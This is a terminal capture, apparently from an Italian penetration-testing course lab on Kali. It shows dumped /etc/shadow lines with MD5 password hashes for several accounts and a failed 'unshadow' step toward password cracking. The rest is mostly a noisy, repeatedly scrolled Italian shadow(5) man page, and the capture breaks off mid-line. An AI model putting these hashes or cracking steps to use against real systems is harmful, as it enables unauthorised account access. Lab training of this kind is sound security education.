+ftp:*:14685:0:99999:7:::
+postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
+mysql:!:14685:0:99999:7:::
+tomcat55:*:14691:0:99999:7:::
+distccd:*:14698:0:99999:7:::
+user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
+service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
+telnetd:*:14715:0:99999:7:::
+proftpd:!:14727:0:99999:7:::
+statd:*:15474:0:99999:7:::
+snmp:*:15480:0:99999:7:::
+alice:$1$lCtstULF$JALYhorA6kHwFiLOQbPBk1:17587:0:99999:7:::
+bob:$1$NuU11mJV$l01w9dV2uFBBqjlKrZL7k1:16994:0:99999:7:::
+david:$1$nTU11mJV$IHhkQ9f4RlpACAbJI3VlV.:16994:0:99999:7:::
+ciao:$1$Zn2wPHiE$O3MsCva4EkH1RPSIo37nf.:18228:0:99999:7:::
+
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# unshadow shadow_s.txt 
+Created directory: /root/.john
+Usage: unshadow PASSWORD-FILE SHADOW-FILE
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# ll
+totale 72
+-rw-r--r-- 1 root root  1418 nov 29 14:40 out_alice.txt
+-rw-r--r-- 1 root root    74 nov 29 14:11 password.txt
+-rw-r--r-- 1 root root  4897 nov 29 14:12 pwd_alice.txt
+-rw-r--r-- 1 root root 49152 nov 29 14:51 script.txt
+-rw-r--r-- 1 root root  1412 nov 29 14:51 shadow_s.txt
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# cp /root/.john/[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kman shadow 
+[?1049h[22;0;0t[?1h=SHADOW(5)                            Formati di file e conversioni                           SHADOW(5)[m
+[m
+[1mNOME[0m[m
+       shadow - file delle password shadow[m
+[m
+[1mDESCRIZIONE[0m[m
+       shadow è un file che contiene le informazioni sulle password per gli account degli utenti e,[m
+       opzionalmente, le informazioni sulla durata delle password («aging»).[m
+[m
+       Questo file non deve essere leggibile dagli utenti normali se si vuole mantenere la sicurezza[m
+       sulle password.[m
+[m
+       Ciascuna riga di questo file contiene 9 campi separati da due punti («:»), nel seguente ordine:[m
+[m
+       [1mnome[0m [1mdi[0m [1mlogin[0m[m
+           Deve essere un nome valido di un account esistente nel sistema.[m
+[m
+       [1mpassword[0m [1mcifrata[0m[m
+           Fare riferimento a [1mcrypt[0m(3) per dettagli sul modo in cui questa stringa viene interpretata.[m
+[m
+           Se il campo password contiene un testo che non è un risultato valido di [1mcrypt[0m(3), come ad[m
+           esempio ! o *, l'utente non potrà accedere al sistema utilizzando la password unix (ma[m
+           potrà accedere al sistema in altri modi).[m
+[m
+           Questo campo può essere vuoto, nel qual caso nessuna password è richiesta per[m
+           l'autenticazione di questo specifico nome di login. Tuttavia alcune applicazioni che[m
+           leggono /etc/shadow possono decidere di non permettere nessun accesso se il campo password[m
+           è vuoto.[m
+[m
+           A password field which starts with an exclamation mark means that the password is locked.[m
+           The remaining characters on the line represent the password field before the password was[m
+           locked.[m
+[m
+       [1mdata[0m [1mdell'ultimo[0m [1mcambio[0m [1mdi[0m [1mpassword[0m[m
+           Data dell'ultimo cambio di password espressa in numero di giorni a partire dal 1 gennaio[m
+           1970.[m
+[m
+           The value 0 has a special meaning, which is that the user should change her password the[m
+           next time she will log in the system.[m
+[m
+           Un campo vuoto implica che la scadenza della password è disabilitata.[m
+[m
+       [1metà[0m [1mminima[0m [1mpassword[0m[m
+           L'età minima password è il numero di giorni che l'utente dovrà attendere prima di poter[m
+           cambiare nuovamente la propria password.[m
+[7m Manual page shadow(5) line 1 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 2 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Un campo vuoto o con valore 0 indica che non c'è una età minima della password.[m
+[7m Manual page shadow(5) line 3 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 4 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1metà[0m [1mmassima[0m [1mpassword[0m[m
+[7m Manual page shadow(5) line 5 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           L'età massima password è il numero di giorni dopo il quale l'utente deve cambiare la[m
+[7m Manual page shadow(5) line 6 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           propria password.[m
+[7m Manual page shadow(5) line 7 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 8 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Quando questo numero di giorni è passato, la password può ancora essere valida. All'utente[m
+[7m Manual page shadow(5) line 9 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           verrà chiesto di cambiare la password durante il successivo accesso.[m
+[7m Manual page shadow(5) line 10 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 11 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Un campo vuoto indica che non ci sono una età massima password, un periodo di avviso e[m
+[7m Manual page shadow(5) line 12 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           nessun periodo di inattività (vedere oltre).[m
+[7m Manual page shadow(5) line 13 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 14 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Se l'età massima password è minore dell'età minima password, l'utente non può cambiare la[m
+[7m Manual page shadow(5) line 15 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           propria password.[m
+[7m Manual page shadow(5) line 16 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 17 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1mperiodo[0m [1mavviso[0m [1mpassword[0m[m
+[7m Manual page shadow(5) line 18 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Il numero di giorni prima della scadenza di una password (vedere età massima password,[m
+[7m Manual page shadow(5) line 19 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           sopra) durante il quale l'utente riceve un avviso.[m
+[7m Manual page shadow(5) line 20 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 21 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Un campo vuoto e il valore 0 indicano che non c'è un periodo di avviso password.[m
+[7m Manual page shadow(5) line 22 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 23 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1mperiodo[0m [1minattività[0m [1mpassword[0m[m
+[7m Manual page shadow(5) line 24 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Il numero di giorni dopo la scadenza della password (vedere età massima password, sopra)[m
+[7m Manual page shadow(5) line 25 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           durante il quale la password è ancora accettata (e l'utente dovrebbe aggiornare la propria[m
+[7m Manual page shadow(5) line 26 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           password al primo accesso).[m
+[7m Manual page shadow(5) line 27 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 28 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Dopo la scadenza della password e di questo periodo, l'utente non potrà accedere usando[m
+[7m Manual page shadow(5) line 29 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           questa password, ma dovrà contattare l'amministratore.[m
+[7m Manual page shadow(5) line 30 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 31 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Un campo vuoto implica che non è applicato il periodo di inattività.[m
+[7m Manual page shadow(5) line 32 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 33 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1mdata[0m [1mscadenza[0m [1maccount[0m[m
+[7m Manual page shadow(5) line 34 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           La data di scadenza dell'account, espressa in numero di giorni dal 1 gennaio 1970.[m
+[7m Manual page shadow(5) line 35 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 36 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Note that an account expiration differs from a password expiration. In case of an account[m
+[7m Manual page shadow(5) line 37 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           expiration, the user shall not be allowed to login. In case of a password expiration, the[m
+[7m Manual page shadow(5) line 38 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           user is not allowed to login using her password.[m
+[7m Manual page shadow(5) line 39 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 40 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Un campo vuoto implica che l'account non scade mai.[m
+[7m Manual page shadow(5) line 41 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 42 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Il valore 0 non andrebbe usato perché potrebbe essere interpretato come account che non[m
+[7m Manual page shadow(5) line 43 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           scade o come scaduto il 1 gennaio 1970.[m
+[7m Manual page shadow(5) line 44 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 45 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1mcampo[0m [1mriservato[0m[m
+[7m Manual page shadow(5) line 46 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Questo campo è riservato per uso futuro.[m
+[7m Manual page shadow(5) line 47 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 48 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[1mFILE[0m[m
+[7m Manual page shadow(5) line 49 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       /etc/passwd[m
+[7m Manual page shadow(5) line 50 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Informazioni sugli account utente.[m
+[7m Manual page shadow(5) line 51 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 52 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       /etc/shadow[m
+[7m Manual page shadow(5) line 53 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Informazioni sicure sugli account utente.[m
+[7m Manual page shadow(5) line 54 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 55 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       /etc/shadow-[m
+[7m Manual page shadow(5) line 56 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Copia di backup per /etc/shadow.[m
+[7m Manual page shadow(5) line 57 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 58 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           Notare che questo file viene usato dagli strumenti del pacchetto shadow, ma non da tutti[m
+[7m Manual page shadow(5) line 59 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K           gli strumenti per la gestione di utenti e password.[m
+[7m Manual page shadow(5) line 60 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 61 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[1mVEDERE[0m [1mANCHE[0m[m
+[7m Manual page shadow(5) line 62 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       [1mchage[0m(1), [1mlogin[0m(1), [1mpasswd[0m(1), [1mpasswd[0m(5), [1mpwck[0m(8), [1mpwconv[0m(8), [1mpwunconv[0m(8), [1msu[0m(1), [1msulogin[0m(8)[m
+[7m Manual page shadow(5) line 63 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page shadow(5) line 64 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[Kshadow-utils 4.7                              16/07/2019                                     SHADOW(5)[m
+[7m Manual page shadow(5) line 65 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page shadow(5) line 65/109 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           sopra) durante il quale l'utente riceve un avviso.[m
+[46;1H[K[7m Manual page shadow(5) line 64/109 98% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           Il numero di giorni prima della scadenza di una password (vedere età massima password,[m
+[46;1H[K[7m Manual page shadow(5) line 63/109 98% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM       [1mperiodo[0m [1mavviso[0m [1mpassword[0m[m
+[46;1H[K[7m Manual page shadow(5) line 62/109 95% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[m
+[46;1H[K[7m Manual page shadow(5) line 61/109 94% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           propria password.[m
+[46;1H[K[7m Manual page shadow(5) line 60/109 94% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           Se l'età massima password è minore dell'età minima password, l'utente non può cambiare la[m
+[46;1H[K[7m Manual page shadow(5) line 59/109 93% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[m
+[46;1H[K[7m Manual page shadow(5) line 58/109 91% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           nessun periodo di inattività (vedere oltre).[m
+[46;1H[K[7m Manual page shadow(5) line 57/109 91% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           Un campo vuoto indica che non ci sono una età massima password, un periodo di avviso e[m
+[46;1H[K[7m Manual page shadow(5) line 56/109 90% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[m
+[46;1H[K[7m Manual page shadow(5) line 55/109 90% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           verrà chiesto di cambiare la password durante il successivo accesso.[m
+[46;1H[K[7m Manual page shadow(5) line 54/109 90% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           Quando questo numero di giorni è passato, la password può ancora essere valida. All'utente[m
+[46;1H[K[7m Manual page shadow(5) line 53/109 89% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[m
+[46;1H[K[7m Manual page shadow(5) line 52/109 88% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           propria password.[m
+[46;1H[K[7m Manual page shadow(5) line 51/109 88% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           L'età massima password è il numero di giorni dopo il quale l'utente deve cambiare la[m
+[46;1H[K[7m Manual page shadow(5) line 50/109 88% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM       [1metà[0m [1mmassima[0m [1mpassword[0m[m
+[46;1H[K[7m Manual page shadow(5) line 49/109 87% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[m
+[46;1H[K[7m Manual page shadow(5) line 48/109 87% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           Un campo vuoto o con valore 0 indica che non c'è una età minima della password.[m
+[46;1H[K[7m Manual page shadow(5) line 47/109 87% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[m
+[46;1H[K[7m Manual page shadow(5) line 46/109 86% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           cambiare nuovamente la propria password.[m
+[46;1H[K[7m Manual page shadow(5) line 45/109 85% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           L'età minima password è il numero di giorni che l'utente dovrà attendere prima di poter[m
+[46;1H[K[7m Manual page shadow(5) line 44/109 85% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM       [1metà[0m [1mminima[0m [1mpassword[0m[m
+[46;1H[K[7m Manual page shadow(5) line 43/109 84% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[m
+[46;1H[K[7m Manual page shadow(5) line 42/109 82% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           Un campo vuoto implica che la scadenza della password è disabilitata.[m
+[46;1H[K[7m Manual page shadow(5) line 41/109 82% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[m
+[46;1H[K[7m Manual page shadow(5) line 40/109 81% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           next time she will log in the system.[m
+[46;1H[K[7m Manual page shadow(5) line 39/109 81% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           The value 0 has a special meaning, which is that the user should change her password the[m
+[46;1H[K[7m Manual page shadow(5) line 38/109 80% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[m
+[46;1H[K[7m Manual page shadow(5) line 37/109 78% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           1970.[m
+[46;1H[K[7m Manual page shadow(5) line 36/109 76% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           Data dell'ultimo cambio di password espressa in numero di giorni a partire dal 1 gennaio[m
+[46;1H[K[7m Manual page shadow(5) line 35/109 76% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM       [1mdata[0m [1mdell'ultimo[0m [1mcambio[0m [1mdi[0m [1mpassword[0m[m
+[46;1H[K[7m Manual page shadow(5) line 34/109 75% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[m
+[46;1H[K[7m Manual page shadow(5) line 33/109 73% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           locked.[m
+[46;1H[K[7m Manual page shadow(5) line 32/109 73% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           The remaining characters on the line represent the password field before the password was[m
+[46;1H[K[7m Manual page shadow(5) line 31/109 72% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           A password field which starts with an exclamation mark means that the password is locked.[m
+[46;1H[K[7m Manual page shadow(5) line 30/109 72% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[m
+[46;1H[K[7m Manual page shadow(5) line 29/109 71% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           è vuoto.[m
+[46;1H[K[7m Manual page shadow(5) line 28/109 69% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           leggono /etc/shadow possono decidere di non permettere nessun accesso se il campo password[m
+[46;1H[K[7m Manual page shadow(5) line 27/109 69% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           l'autenticazione di questo specifico nome di login. Tuttavia alcune applicazioni che[m
+[46;1H[K[7m Manual page shadow(5) line 26/109 68% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           Questo campo può essere vuoto, nel qual caso nessuna password è richiesta per[m
+[46;1H[K[7m Manual page shadow(5) line 25/109 66% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[m
+[46;1H[K[7m Manual page shadow(5) line 24/109 64% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           potrà accedere al sistema in altri modi).[m
+[46;1H[K[7m Manual page shadow(5) line 23/109 63% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           esempio ! o *, l'utente non potrà accedere al sistema utilizzando la password unix (ma[m
+[46;1H[K[7m Manual page shadow(5) line 22/109 63% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           Se il campo password contiene un testo che non è un risultato valido di [1mcrypt[0m(3), come ad[m
+[46;1H[K[7m Manual page shadow(5) line 21/109 61% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[m
+[46;1H[K[7m Manual page shadow(5) line 20/109 61% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           Fare riferimento a [1mcrypt[0m(3) per dettagli sul modo in cui questa stringa viene interpretata.[m
+[46;1H[K[7m Manual page shadow(5) line 19/109 60% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM       [1mpassword[0m [1mcifrata[0m[m
+[46;1H[K[7m Manual page shadow(5) line 18/109 58% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[m
+[46;1H[K[7m Manual page shadow(5) line 17/109 57% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM           Deve essere un nome valido di un account esistente nel sistema.[m
+[46;1H[K[7m Manual page shadow(5) line 16/109 57% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM       [1mnome[0m [1mdi[0m [1mlogin[0m[m
+[46;1H[K[7m Manual page shadow(5) line 15/109 56% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[m
+[46;1H[K[7m Manual page shadow(5) line 14/109 54% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM       Ciascuna riga di questo file contiene 9 campi separati da due punti («:»), nel seguente ordine:[m
+[46;1H[K[7m Manual page shadow(5) line 13/109 54% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[m
+[46;1H[K[7m Manual page shadow(5) line 12/109 53% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM       sulle password.[m
+[46;1H[K[7m Manual page shadow(5) line 11/109 52% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM       Questo file non deve essere leggibile dagli utenti normali se si vuole mantenere la sicurezza[m
+[46;1H[K[7m Manual page shadow(5) line 10/109 52% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[m
+[46;1H[K[7m Manual page shadow(5) line 9/109 50% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM       opzionalmente, le informazioni sulla durata delle password («aging»).[m
+[46;1H[K[7m Manual page shadow(5) line 8/109 48% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM       shadow è un file che contiene le informazioni sulle password per gli account degli utenti e,[m
+[46;1H[K[7m Manual page shadow(5) line 7/109 48% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[1mDESCRIZIONE[0m[m
+[46;1H[K[7m Manual page shadow(5) line 6/109 48% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[m
+[46;1H[K[7m Manual page shadow(5) line 5/109 46% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM       shadow - file delle password shadow[m
+[46;1H[K[7m Manual page shadow(5) line 4/109 45% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[1mNOME[0m[m
+[46;1H[K[7m Manual page shadow(5) line 3/109 45% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[m
+[46;1H[K[7m Manual page shadow(5) line 2/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HMSHADOW(5)                            Formati di file e conversioni                           SHADOW(5)[m
+[46;1H[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page shadow(5) line 1/109 43% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page 